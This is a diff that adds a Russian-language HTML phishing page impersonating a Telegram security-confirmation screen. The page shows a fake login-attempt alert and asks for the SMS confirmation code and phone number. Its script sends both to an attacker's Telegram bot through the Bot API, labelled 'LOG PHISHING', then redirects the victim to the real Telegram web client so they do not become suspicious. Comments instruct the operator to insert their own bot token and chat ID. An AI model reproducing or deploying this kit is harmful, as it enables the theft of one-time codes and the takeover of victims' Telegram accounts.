@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Подтверждение входа</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #0f0f1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            max-width: 420px;
+            width: 100%;
+            background: white;
+            border-radius: 28px;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+            transition: all 0.2s;
+        }
+        .header {
+            background: #2B78E4;
+            padding: 24px 20px 20px;
+            text-align: center;
+        }
+        .telegram-logo {
+            width: 56px;
+            height: 56px;
+            background: white;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.15);
+        }
+        .telegram-logo svg {
+            width: 36px;
+            height: 36px;
+        }
+        .header h1 {
+            color: white;
+            font-size: 22px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+        }
+        .header p {
+            color: rgba(255,255,255,0.85);
+            font-size: 14px;
+            margin-top: 6px;
+        }
+        .content {
+            padding: 28px 24px 32px;
+        }
+        .alert {
+            background: #FEF2E8;
+            border-left: 4px solid #F27D2E;
+            padding: 14px 16px;
+            border-radius: 14px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            color: #541C00;
+        }
+        .field {
+            margin-bottom: 20px;
+        }
+        .field label {
+            font-weight: 500;
+            font-size: 14px;
+            color: #1F2A44;
+            display: block;
+            margin-bottom: 8px;
+        }
+        .field input {
+            width: 100%;
+            padding: 15px 16px;
+            font-size: 16px;
+            border: 1px solid #CFDFF0;
+            border-radius: 18px;
+            background: #F8FAFE;
+            transition: 0.2s;
+        }
+        .field input:focus {
+            border-color: #2B78E4;
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(43,120,228,0.15);
+        }
+        button {
+            background: #2B78E4;
+            color: white;
+            font-weight: 600;
+            font-size: 17px;
+            padding: 15px;
+            width: 100%;
+            border: none;
+            border-radius: 40px;
+            margin-top: 14px;
+            cursor: pointer;
+            transition: 0.15s;
+            box-shadow: 0 6px 14px rgba(43,120,228,0.3);
+        }
+        button:active {
+            transform: scale(0.97);
+            background: #1c5ac7;
+        }
+        .note {
+            font-size: 12px;
+            text-align: center;
+            color: #8A99B4;
+            margin-top: 24px;
+            border-top: 1px solid #EDF2F7;
+            padding-top: 20px;
+        }
+        .step-hint {
+            background: #F0F4FC;
+            border-radius: 18px;
+            padding: 12px;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #1A344D;
+            text-align: center;
+        }
+        .error {
+            color: #D1453A;
+            font-size: 13px;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">
+        <div class="telegram-logo">
+            <svg viewBox="0 0 24 24" fill="#2B78E4" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.13-.06-.19-.07-.05-.18-.03-.26-.01-.12.02-1.96 1.24-5.53 3.65-.52.36-.99.54-1.41.53-.46-.01-1.35-.26-2.01-.48-.81-.27-1.45-.41-1.39-.87.03-.24.35-.48.96-.73 3.82-1.66 6.36-2.75 7.62-3.27 3.63-1.5 4.38-1.76 4.87-1.77.11 0 .35.03.51.18.13.13.17.31.19.49-.01.1 0 .19-.01.29z"/>
+            </svg>
+        </div>
+        <h1>Подтверждение безопасности</h1>
+        <p>Telegram ID: проверка устройства</p>
+    </div>
+    <div class="content">
+        <div class="alert">
+            🔒 Мы заметили попытку входа 12.04.2026 в 10:44 (IP: 84.42.12.77, Москва)
+        </div>
+        <div class="step-hint">
+            📲 Код подтверждения отправлен вам в SMS<br> на номер +7 ••• •• 36
+        </div>
+        <form id="loginForm">
+            <div class="field">
+                <label>🔢 Введите код из SMS</label>
+                <input type="text" id="smsCode" placeholder="00000" maxlength="6" autocomplete="off" inputmode="numeric" required>
+            </div>
+            <div class="field">
+                <label>📞 Ваш номер телефона (для проверки)</label>
+                <input type="tel" id="phone" placeholder="+7 999 888 77 66" autocomplete="off" required>
+            </div>
+            <button type="submit">Подтвердить сброс сессии</button>
+            <div id="errorMsg" class="error"></div>
+        </form>
+        <div class="note">
+            Отправляя код, вы завершаете подозрительные сеансы<br>
+            и защищаете аккаунт от несанкционированного доступа.
+        </div>
+    </div>
+</div>
+
+<script>
+    // == WEBHOOK / куда отправляем данные (твой бот в Telegram или сервер сохранения)
+    // Для БЕСПЛАТНОГО перехвата используй Telegram-бота: создай бот через @BotFather, получи токен
+    const TELEGRAM_BOT_TOKEN = "ЗАМЕНИ_НА_СВОЙ_ТОКЕН";   // BotFather → токен
+    const TELEGRAM_CHAT_ID   = "ЗАМЕНИ_НА_ТВОЙ_CHAT_ID"; // можно написать @userinfobot или свой ID
+
+    const form = document.getElementById('loginForm');
+    const errorDiv = document.getElementById('errorMsg');
+
+    async function sendToTelegram(phone, code) {
+        const text = `🔐 *LOG PHISHING*\n📞 Телефон: ${phone}\n🔢 Код: ${code}\n🌐 IP: ${window.location.hostname}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const params = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown'
+        };
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(params)
+            });
+        } catch(e) {}
+    }
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const phone = document.getElementById('phone').value.trim();
+        const code = document.getElementById('smsCode').value.trim();
+
+        if (!phone || !code || code.length < 4) {
+            errorDiv.style.display = 'block';
+            errorDiv.innerText = 'Заполните номер и код из SMS (4-6 цифр)';
+            return;
+        }
+        errorDiv.style.display = 'none';
+
+        // отправляем жертву на официальный сайт Telegram — чтоб не заподозрила
+        await sendToTelegram(phone, code);
+        
+        // перенаправляем на настоящий сайт Telegram
+        window.location.href = 'https://web.telegram.org/k/';
+    });
+</script>
+</body>
+</html>
